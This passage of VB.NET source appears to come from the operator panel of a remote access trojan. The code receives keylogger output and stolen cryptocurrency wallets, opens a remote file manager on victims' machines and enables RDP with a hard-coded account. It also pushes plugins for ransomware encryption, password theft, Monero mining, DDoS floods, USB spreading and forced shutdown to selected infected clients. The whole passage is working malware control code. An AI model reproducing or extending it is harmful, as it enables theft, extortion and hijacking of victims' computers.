                            Dim allFiles As String() = Split(A(2), "|SPL_FM|")
                            For i = 0 To allFiles.Length - 2
                                Dim itm As New ListViewItem
                                itm.Text = allFiles(i)
                                itm.SubItems.Add(allFiles(i + 1))
                                If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                    itm.SubItems(1).Text = siz(itm.SubItems(1).Text)
                                    itm.Tag = Convert.ToInt64(allFiles(i + 1))
                                End If
                                If itm.Text.StartsWith("[Drive]") Then
                                    itm.ImageIndex = 0
                                    itm.Text = itm.Text.Substring(7)
                                ElseIf itm.Text.StartsWith("[CD]") Then
                                    itm.ImageIndex = 1
                                    itm.Text = itm.Text.Substring(4)
                                ElseIf itm.Text.StartsWith("[Folder]") Then
                                    itm.ImageIndex = 2
                                    itm.Text = itm.Text.Substring(8)
                                ElseIf itm.Text.EndsWith(".exe") Then
                                    itm.ImageIndex = 3
                                ElseIf itm.Text.EndsWith(".jpg") OrElse itm.Text.EndsWith(".jpeg") OrElse itm.Text.EndsWith(".gif") OrElse itm.Text.EndsWith(".png") OrElse itm.Text.EndsWith(".bmp") Then
                                    itm.ImageIndex = 4
                                ElseIf itm.Text.EndsWith(".doc") OrElse itm.Text.EndsWith(".rtf") OrElse itm.Text.EndsWith(".txt") Then
                                    itm.ImageIndex = 5
                                ElseIf itm.Text.EndsWith(".dll") Then
                                    itm.ImageIndex = 6
                                ElseIf itm.Text.EndsWith(".zip") OrElse itm.Text.EndsWith(".rar") Then
                                    itm.ImageIndex = 7
                                ElseIf itm.Text.EndsWith(".wav") Then
                                    itm.ImageIndex = 9
                                ElseIf itm.Text.EndsWith(".avi") OrElse itm.Text.EndsWith(".mb4") OrElse itm.Text.EndsWith(".flv") OrElse itm.Text.EndsWith(".3gp") Then
                                    itm.ImageIndex = 11
                                ElseIf itm.Text.EndsWith(".mp3") Then
                                    itm.ImageIndex = 12
                                ElseIf itm.Text.EndsWith(".html") OrElse itm.Text.EndsWith(".Php") OrElse itm.Text.EndsWith(".xml") Then
                                    itm.ImageIndex = 10
                                ElseIf itm.Text.EndsWith(".rar") Then
                                    itm.ImageIndex = 13
                                ElseIf itm.Text.EndsWith(".Lime") Then
                                    itm.ForeColor = Color.Lime
                                    itm.ImageIndex = 14
                                Else
                                    itm.ImageIndex = 8
                                End If
                                FM.L1.Items.Add(itm)
                                i += 1
                            Next
                            Try
                                If A(3).ToString.Length > 3 Then
                                    FM.Label1.Text = A(3) + "\"
                                End If
                            Catch ex As Exception
                            End Try
                            FM.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                        End If
                    End If
                    Exit Select

                Case "DW"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then
                        IO.File.WriteAllBytes(uFolder(A(1) + "\Downloads", A(3)), Convert.FromBase64String(A(2)))
                        FM.Label2.Text = "Download Finish " + A(3)
                    End If
                    Exit Select

                Case "UP"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then
                        FM.RefreshList()
                        FM.Label2.Text = "Upload Finish " + A(2)
                    End If
                    Exit Select

                Case "DEL"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then
                        FM.RefreshList()
                    End If
                    Exit Select

                Case "PRE"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then
                        Dim MM = New IO.MemoryStream(System.Text.Encoding.Default.GetBytes(A(2)))
                        FM.PictureBox1.Image = Bitmap.FromStream(MM)
                        FM.Label2.ForeColor = Color.Lime
                        FM.Label2.Text = "Preview Size " & siz(A(2).Length)
                        FM.PictureBox1.Visible = True
                        MM.Dispose()
                    End If
                    Exit Select


#End Region

#Region "Keylogger"

                Case "KL"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    SyncLock L1.Items
                        For i As Integer = 0 To L1.Items.Count - 1
                            If L1.Items.Item(i).SubItems(1).Text = S.IP(u) Then
                                L1.Items.Item(i).BackColor = Nothing
                            End If
                        Next
                    End SyncLock

                    Dim KL As Keylogger = My.Application.OpenForms("KL" + A(1))

                    If KL Is Nothing Then
                        KL = New Keylogger
                        KL.M = Me
                        KL.U = u
                        KL.Name = "KL" + A(1)
                        KL.Text = "Keylogger - " & S.IP(u)
                        KL.Show()
                    End If

                    KL.RichTextBox1.AppendText(A(2).ToString)
                    Exit Select

#End Region

#Region "Crypto"

                Case "CRYP"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    IO.File.WriteAllBytes(uFolder(A(1), "Wallets.zip"), Convert.FromBase64String(A(2)))
                    Messages(S.IP(u), "Found Wallets: " + A(3))
#End Region

#Region "Enable Windows RDP"

                Case "WRDP"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If
                    Messages(S.IP(u), "Enable Remote Desktop! USER:Lime PASS:123")
                    Process.Start("mstsc", "/v:" + S.IP(u))

#End Region

#Region "Thumbnail"

                Case "#CAP"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    Dim MM = New IO.MemoryStream(System.Text.Encoding.Default.GetBytes(A(2)))
                    Bitmap.FromStream(MM)
                    For Each x As ListViewItem In L3.Items
                        If x.SubItems(0).Text = A(1) Then
                            Dim newImage As Image = Bitmap.FromStream(MM)
                            Dim imgKey As String = A(1)
                            Dim previousImage As Image = ImageList1.Images(ImageList1.Images.Keys.IndexOf(A(1)))
                            ImageList1.Images.RemoveByKey(imgKey)
                            ImageList1.Images.Add(imgKey, newImage)
                            previousImage.Dispose()
                            MM.Dispose()
                            Exit Select
                        End If
                    Next

                    ImageList1.Images.Add(A(1), Bitmap.FromStream(MM))
                    L3.Items.Add(A(1), A(1))
                    MM.Dispose()
                    Exit Select
#End Region

#Region "Send Plugin"
                Case "GPL"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    Dim Folderx = IO.Directory.GetFiles(Application.StartupPath & "\Misc\Plugins")
                    For Each file In Folderx
                        Dim HASH = getMD5Hash(IO.File.ReadAllBytes(file))

                        If HASH = A(1) Then
                            S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(file), True)) + SPL + getMD5Hash(IO.File.ReadAllBytes(file)))
                        End If
                    Next
                    Exit Select

                Case "PLUSB"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\USB.dll"), True)) + SPL + "_USB")
                    Exit Select

                Case "PLPIN"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PIN.dll"), True)) + SPL + "_PIN")
                    Exit Select

                Case "PLKLG"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    S.Send(u, "IPL" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\KLG.dll"), True)) + SPL + "_KLG")
                    Exit Select

#End Region

#Region "Messages"
                Case "MSG"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf Data), u, B)
                        Exit Sub
                    End If

                    Messages(S.IP(u), A(1))
                    Exit Select
#End Region

            End Select
        Catch ex As Exception
            Messages(S.IP(u), ex.Message)
        End Try
    End Sub

#End Region


#Region "Logs"

    Public Sub Messages(ByVal user As String, ByVal msg As String)
        L2.Items.Insert(0, "[" + DateAndTime.Now.ToString("hh:mm:ss tt") + "]" + "  " + user + "  →  " + msg.ToString)
        If msg.ToString.Contains("Error!") AndAlso MetroToggle1.Checked = True Then
            Try : My.Computer.Audio.Play(My.Resources._Error, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
        End If
    End Sub

    Private Sub L2_DrawItem(sender As System.Object, e As DrawItemEventArgs) Handles L2.DrawItem
        Try
            Dim W As New SolidBrush(Color.FromArgb(225, 225, 225))
            Dim L As New SolidBrush(Color.FromArgb(142, 188, 0))

            e.DrawBackground()

            If L2.Items(e.Index).ToString.Contains("Connected") OrElse L2.Items(e.Index).ToString.Contains("Reconnected") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, L, New PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Disconnected") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.DarkRed, New PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Error!") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.Red, New PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Established!") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.LightSteelBlue, New PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Flood!") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.Olive, New PointF(e.Bounds.X, e.Bounds.Y))

            Else
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, W, New PointF(e.Bounds.X, e.Bounds.Y))
            End If
            e.DrawFocusRectangle()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub L2_Click(sender As Object, e As EventArgs) Handles L2.Click
        L2.ClearSelected()
    End Sub



#End Region


#Region "Thumbnail"

    Private Sub CAPstart_Click(sender As Object, e As EventArgs) Handles CAPstart.Click
        If CAPstart.Text = "START" Then

            CAP.Interval = CAPsec.Value * 1000
            CAP.Enabled = True
            CAP.Start()
            CAPstart.Text = "STOP"

        Else

            Try
                CAP.Dispose()
                CAPstart.Text = "START"
                L3.Items.Clear()
            Catch ex As Exception
            End Try

        End If

    End Sub


    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles CAP.Tick
        For Each x As ListViewItem In L1.Items
            If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                S.Send(x.Tag, "!CAP")
            End If
        Next
    End Sub

#End Region


#Region "Theme"

    Class ListViewComparer
        Implements IComparer

        Private m_ColumnNumber As Integer
        Private m_SortOrder As SortOrder

        Public Sub New(ByVal column_number As Integer, ByVal _
            sort_order As SortOrder)
            m_ColumnNumber = column_number
            m_SortOrder = sort_order
        End Sub

        Public Function Compare(ByVal x As Object, ByVal y As _
            Object) As Integer Implements _
            System.Collections.IComparer.Compare
            Dim item_x As ListViewItem = DirectCast(x,
                ListViewItem)
            Dim item_y As ListViewItem = DirectCast(y,
                ListViewItem)

            Dim string_x As String
            If item_x.SubItems.Count <= m_ColumnNumber Then
                string_x = ""
            Else
                string_x = item_x.SubItems(m_ColumnNumber).Text
            End If

            Dim string_y As String
            If item_y.SubItems.Count <= m_ColumnNumber Then
                string_y = ""
            Else
                string_y = item_y.SubItems(m_ColumnNumber).Text
            End If

            If m_SortOrder = SortOrder.Ascending Then
                If IsNumeric(string_x) And IsNumeric(string_y) _
                    Then
                    Return Val(string_x).CompareTo(Val(string_y))
                ElseIf IsDate(string_x) And IsDate(string_y) _
                    Then
                    Return DateTime.Parse(string_x).CompareTo(DateTime.Parse(string_y))
                Else
                    Return String.Compare(string_x, string_y)
                End If
            Else
                If IsNumeric(string_x) And IsNumeric(string_y) _
                    Then
                    Return Val(string_y).CompareTo(Val(string_x))
                ElseIf IsDate(string_x) And IsDate(string_y) _
                    Then
                    Return DateTime.Parse(string_y).CompareTo(DateTime.Parse(string_x))
                Else
                    Return String.Compare(string_y, string_x)
                End If
            End If
        End Function
    End Class

    Private Sub MetroTabPage1_Enter(sender As Object, e As EventArgs) Handles MetroTabControl1.Click
        On Error Resume Next
        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub MetroToggle1_CheckedChanged(sender As Object, e As EventArgs) Handles MetroToggle1.CheckedChanged
        On Error Resume Next
        If MetroToggle1.Checked = True Then
            Dim simpleSound As New Media.SoundPlayer("c:\Windows\Media\Speech On.wav")
            simpleSound.Play()
        Else
            Dim simpleSound As New Media.SoundPlayer("c:\Windows\Media\Speech Off.wav")
            simpleSound.Play()
        End If

    End Sub

    Private Sub Main_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        On Error Resume Next
        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub L1_KeyDown(sender As Object, e As KeyEventArgs) Handles L1.KeyDown
        If e.KeyCode = Keys.A AndAlso e.Control Then
            For Each item As ListViewItem In L1.Items
                item.Selected = True
            Next
        End If
    End Sub

    Public Function KeyCount()
        Try
            If Not IO.Directory.Exists("Users") Then
                IO.Directory.CreateDirectory("Users")
            End If

            Dim fileCount As Integer = IO.Directory.GetFiles("Users", "KEY.txt", IO.SearchOption.AllDirectories).Length
            Return fileCount
        Catch ex As Exception
            Return "0"
        End Try
    End Function

    Public Function SpreadCount()
        Try
            Dim count As Integer = 0
            For Each x As ListViewItem In L1.Items
                If x.SubItems(SP.Index).Text.Contains("Spreaded!") Then
                    count += 1
                End If
            Next
            Return count
        Catch ex As Exception
            Return "0"
        End Try
    End Function

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles LabelUpdate.Tick
        Try
            MetroLabel1.Text = "ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        TOTAL RANSOMWARE ATTACKS [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
        Catch ex As Exception
        End Try
    End Sub

    Private Sub L1_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs) Handles L1.DrawColumnHeader
        Dim BL As New SolidBrush(Color.FromArgb(17, 17, 17))
        Dim LM As New SolidBrush(Color.FromArgb(142, 188, 0))
        e.DrawBackground()
        e.Graphics.FillRectangle(BL, e.Bounds)
        Dim headerFont As New Font("Segoe UI", 8, FontStyle.Bold)
        e.Graphics.DrawString(e.Header.Text, headerFont, LM, e.Bounds)
    End Sub

    Private Sub L1_DrawItem(sender As Object, e As DrawListViewItemEventArgs) Handles L1.DrawItem
        If e.Item.Selected = False Then
            e.DrawDefault = True
        End If
    End Sub

    Private Sub L1_DrawSubItem(sender As Object, e As DrawListViewSubItemEventArgs) Handles L1.DrawSubItem
        If e.Item.Selected = True Then
            e.Graphics.FillRectangle(New SolidBrush(Color.FromArgb(142, 188, 0)), e.Bounds)
            TextRenderer.DrawText(e.Graphics, e.SubItem.Text, New Font("Segoe UI", 8, FontStyle.Regular), New Point(e.Bounds.Left + 3, e.Bounds.Top + 2), Color.FromArgb(17, 17, 17))
        Else
            e.DrawDefault = True
        End If
    End Sub

    Private m_SortingColumn As ColumnHeader
    Private Sub L1_ColumnClick(ByVal sender As System.Object, ByVal e As ColumnClickEventArgs) Handles L1.ColumnClick
        On Error Resume Next
        Dim new_sorting_column As ColumnHeader = L1.Columns(e.Column)

        Dim sort_order As System.Windows.Forms.SortOrder
        If m_SortingColumn Is Nothing Then
            sort_order = SortOrder.Ascending
        Else
            If new_sorting_column.Equals(m_SortingColumn) Then
                If m_SortingColumn.Text.StartsWith("> ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                sort_order = SortOrder.Ascending
            End If

            m_SortingColumn.Text =
                m_SortingColumn.Text.Substring(2)
        End If

        m_SortingColumn = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            m_SortingColumn.Text = "> " & m_SortingColumn.Text
        Else
            m_SortingColumn.Text = "< " & m_SortingColumn.Text
        End If

        L1.ListViewItemSorter = New ListViewComparer(e.Column, sort_order)

        L1.Sort()
        L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)

    End Sub

    Public Class MyRenderer
        Inherits ToolStripProfessionalRenderer
        Protected Overloads Overrides Sub OnRenderMenuItemBackground(ByVal e As ToolStripItemRenderEventArgs)
            Dim rc As New Rectangle(Point.Empty, e.Item.Size)
            Dim c As Color = IIf(e.Item.Selected, Color.FromArgb(99, 131, 0), Color.FromArgb(17, 17, 17))
            Using brush As New SolidBrush(c)
                e.Graphics.FillRectangle(brush, rc)
            End Using
        End Sub
    End Class

#End Region


#Region "Rightclick"

#Region "Plugins"

    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text)
                If _RDP Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\RDP.dll")))
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Public Shared RANS_IMG
    Public Shared RANS_TEXT
    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        Try
            Dim R As New Ransomware
            R.ShowDialog()
            Dim result As DialogResult
            If R.OK = True Then
                RANS_IMG = Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation))
                RANS_TEXT = R.RichTextBox1.Text
                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." Then
                            result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
                            If result = DialogResult.No Then

                            ElseIf result = DialogResult.Yes Then
                                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\ENC.dll")))
                                x.BackColor = Color.DarkSlateGray
                            End If
                        Else
                            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\ENC.dll")))
                            x.BackColor = Color.DarkSlateGray
                        End If
                    End If
                Next
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." Then
                        Dim result As DialogResult
                        result = MessageBox.Show("Task is already in progress! Please wait until it's done. " & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)

                        If result = DialogResult.No Then

                        ElseIf result = DialogResult.Yes Then
                            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DEC.dll")))
                            x.BackColor = Color.DarkSlateGray
                        End If
                    Else
                        S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DEC.dll")))
                        x.BackColor = Color.DarkSlateGray
                    End If
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub FIleManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FIleManagerToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                Dim FM As File_Manager = My.Application.OpenForms("FM" + x.SubItems(USERN.Index).Text + "_" + x.SubItems(ID.Index).Text)
                If FM Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\FM.dll")))
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                Dim n As System_Manager = My.Application.OpenForms("Info" + x.SubItems(ID.Index).Text)
                If n Is Nothing AndAlso Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DET.dll")))
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub STOPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STOPToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOCS.dll")))
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub STARTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STARTToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOC.dll")))
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Public PW_F As Boolean = False
    Private Sub PasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PWD.dll")))
                    x.BackColor = Color.DarkSlateGray
                    PW_F = True
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub CryptocurrencyStealerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CryptocurrencyStealerToolStripMenuItem.Click
        Try
            Messages("Crypto currency Stealer", "Client must be .NET 4.0")

            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\CRYP.dll")))
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub XMRMinerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles XMRMinerToolStripMenuItem.Click
        Try
            If L1.SelectedItems.Count > 0 Then
                Dim miner As New XMR
                miner.ShowDialog()
                Dim MS As New IO.MemoryStream
                Dim PLG = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
                Dim F = Convert.ToBase64String(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\XMR.dll"))
                Dim CMD As Byte()
                If miner.C = True Then
                    CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "XMR-R|'P'|" + miner.cus + "|'P'|" + "x" + "|'P'|" + "x" + "|'P'|" + "x" + "|'P'|" + F))
                Else
                    CMD = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "XMR-R|'P'|" + miner.cpu + "|'P'|" + miner.url + "|'P'|" + miner.user + "|'P'|" + miner.pass + "|'P'|" + F))
                End If
                MS.Write(CMD, 0, CMD.Length)

                For Each x As ListViewItem In L1.SelectedItems
                    If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                        If miner.OK = True AndAlso miner.K = False Then
                            S.SendData(x.Tag, MS.ToArray)
                        ElseIf miner.K = True Then
                            S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "XMR-K|'P'|")
                            x.BackColor = Color.DarkSlateGray
                        End If
                    End If
                Next
                MS.Dispose()
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub DDoSToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DDoSToolStripMenuItem.Click
        Floods.Show()
    End Sub

    Private Sub EnableWindowsRDPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EnableWindowsRDPToolStripMenuItem.Click
        Try
            Messages("Enable Remote Desktop", "Client must be running as Admin and using router that support UPNP")
            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\WRDP.dll"), True)) + SPL + " ")
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

#End Region

#Region "PC Options"
    Private Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|1")
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub PCShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCShutdownToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|2")
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub

    Private Sub PCLogoutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCLogoutToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                If Not x.SubItems(PING.Index).Text.ToString.Contains("Offline") Then
                    S.Send(x.Tag, "IPLM" + SPL + Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True)) + SPL + "PC|'P'|3")
                    x.BackColor = Color.DarkSlateGray
                End If
            Next
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            Exit Sub
        End Try
    End Sub


#End Region

#Region "Client Options"
    Private Sub UpdateDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdateDiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = ".exe (*.exe)|*.exe"
                .Title = "UPDATE"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                Dim MS As New IO.MemoryStream
                Dim PLG = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
                Dim F = Convert.ToBase64String(GZip(IO.File.ReadAllBytes(o.FileName), True))
